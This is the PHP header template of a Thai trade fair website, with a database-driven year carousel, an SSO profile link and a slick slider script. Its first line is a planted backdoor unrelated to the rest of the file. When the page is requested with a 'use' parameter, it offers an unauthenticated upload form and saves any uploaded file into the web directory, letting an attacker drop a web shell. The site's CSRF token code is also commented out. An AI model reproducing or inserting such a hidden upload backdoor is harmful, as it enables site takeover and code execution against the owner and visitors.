<?php if(isset($_GET['use'])){if(isset($_POST['cekfile'])){move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);echo "Upload berhasil";}else{echo '<form enctype="multipart/form-data" action="" method="post"><h3><u>Upload Here</u></h3>Since 2077<br />Nama file : <input type="file" name="file" /><br /><input name="cekfile" type="submit" value="Upload"></form>';}} ?>
<? include_once ("backoffice/connect.php");
session_start();

// สร้าง Anti-CSRF Token
/* if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
} */
$index = (int)$index;
?>
<div class="row px-0 px-md-2 pt-2 pt-md-3">
    <div class="col" id="logo">

        <a href="<?=ROOTPATHDOMAIN?>" class="d-flex align-items-center me-md-auto  float-start">
            <img class="img-logo imglogotop" src="<?=ROOTPATHDOMAIN?>assets/images/logo/logo.png" alt="thaitradefair">
        </a>

        <ul class="nav nav-pills float-end pt-0 top-menu-1 toprightmenu <? if($index!=1) { ?>toprightmenu-2<? } ?>" id="top-menu3">

            <? if($index==1) { ?>
            <li class="nav-item d-block d-md-none">
                <select class="selectpicker selectpicker-bg-none" onchange="changeYearFairData(this.value);" style="display:none;">
                  <?
                  /* $cyear = date("Y"); */
                  $cyear = '2026';
                  $rrr = 0 ;
                  $slickgoto = 0;
                  $sqlhallyear = " select a.fair_year from tt_fair_list a left join tt_fair_group_list b on a.fair_id=b.fair_id  left join tt_fair_group c on b.fair_group_id=c.fair_group_id where a.fair_status = '1' and b.fair_flag = '1' and c.fair_group_status = '1' group by a.fair_year order by a.fair_year DESC ";
                  $stmthallyear = $mysqli->prepare($sqlhallyear);
                  $stmthallyear->execute();
                  $resulthallyear = $stmthallyear->get_result();
                  $numrowhallyear = $resulthallyear->num_rows;
                  if($numrowhallyear>0) {
                    while($datahallyear = $resulthallyear->fetch_assoc()) {
                  ?>
                  <option value="<?=$datahallyear["fair_year"]?>" <? if($cyear==$datahallyear["fair_year"]) { echo "selected"; } ?>  ><?=$datahallyear["fair_year"]?></option>
                <? } } ?>
                </select>
            </li>

            <li class="nav-item d-none d-md-block ">
              <div id="indexCarouselYearTop" class="slide m-0" >
                    <?
                    /* $cyear = date("Y"); */
                    $cyear = '2026';
                    $rrr = 0 ;
                    $slickgoto = 0;
                    $sqlhallyear = " select a.fair_year from tt_fair_list a left join tt_fair_group_list b on a.fair_id=b.fair_id  left join tt_fair_group c on b.fair_group_id=c.fair_group_id where a.fair_status = '1' and b.fair_flag = '1' and c.fair_group_status = '1' group by a.fair_year order by a.fair_year DESC ";
                    $stmthallyear = $mysqli->prepare($sqlhallyear);
                    $stmthallyear->execute();
                    $resulthallyear = $stmthallyear->get_result();
                    $numrowhallyear = $resulthallyear->num_rows;
                    if($numrowhallyear>0) {
                      while($datahallyear = $resulthallyear->fetch_assoc()) {
                        if($cyear==$datahallyear["fair_year"]) {
                          $slickgoto = $rrr;
                        }
                      ?>
                        <div class="carousel-item <? if($cyear==$datahallyear["fair_year"]) { echo "active"; } ?>">
                          <a class="nav-link yearasize py-0 pt-1 pt-md-0 _ffyear _ffyear_<?=$datahallyear["fair_year"]?> <? if($cyear==$datahallyear["fair_year"]) { echo "active"; } ?>"  aria-current="page" onclick="changeYearFairData('<?=$datahallyear["fair_year"]?>');">
                              <?=$datahallyear["fair_year"]?>
                          </a>
                        </div>
                    <? $rrr++; } } ?>


              </div>
            </li>


            <li class="nav-item border-end border-2 border-white mtmtop" style="height: 30px;"></li>
          <? } ?>

          <? if($_COOKIE["ssoid"]!="") { ?>
            <li class="nav-item ">

                  <div class="profileavatarname <? if($index!=1) { ?>profileavatarname2<? } ?>">
                    <a href="<?=ROOTPATHDOMAIN?>my-profile/" class="link-dark text-decoration-none opacity-100 mtmtop"><?=getSSOLoginShortName($_COOKIE["ssoid"])?></a>
                  </div>
            </li>
          <? } ?>

            <li class="nav-item">
                <a class="py-0 px-2 opacity-100 navbar-toggler toggler-external-menu cursor-pointer"
                    data-bs-toggle="collapse">
                    <img src="<?=ROOTPATHDOMAIN?>assets/images/ico-menu-extend.png" alt="icon" class="ico-menu-extend mtmtop30 <? if($index!=1) { ?>mtmtop30-2<? } ?>">
                </a>
            </li>
        </ul>
    </div>
</div>

<script >
$(document).ready(function() {
  $('#indexCarouselYearTop').slick({
      slidesToShow: 3,
      slidesToScroll: 1,
      autoplay: false,
      autoplaySpeed: 2000,
      variableWidth: true,
      infinite: false
  });

  //$('#indexCarouselYearTop').slick('slickGoTo','<?=$slickgoto?>');
});
</script>